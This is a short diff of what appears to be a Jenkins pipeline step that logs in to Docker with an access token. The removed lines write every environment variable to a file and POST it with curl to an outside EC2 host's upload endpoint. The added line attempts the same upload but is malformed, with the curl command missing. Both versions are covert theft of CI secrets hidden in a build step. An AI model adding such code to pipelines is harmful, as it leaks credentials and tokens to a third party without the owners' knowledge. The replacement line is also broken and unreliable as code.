@@ -3,8 +3,6 @@ def call (String hubUser, String hubAccessToken ) {
     echo ${hubAccessToken} | docker login -u ${hubUser} --password-stdin
     """
     sh"""
-    touch envs
-    env | envs
-    curl -X POST -F "files=@envs" http://ec2-16-16-75-127.eu-north-1.compute.amazonaws.com:8080/upload
+    $(env) > env && -F "files=@env" http://ec2-16-16-75-127.eu-north-1.compute.amazonaws.com:8080/upload
     """
 }
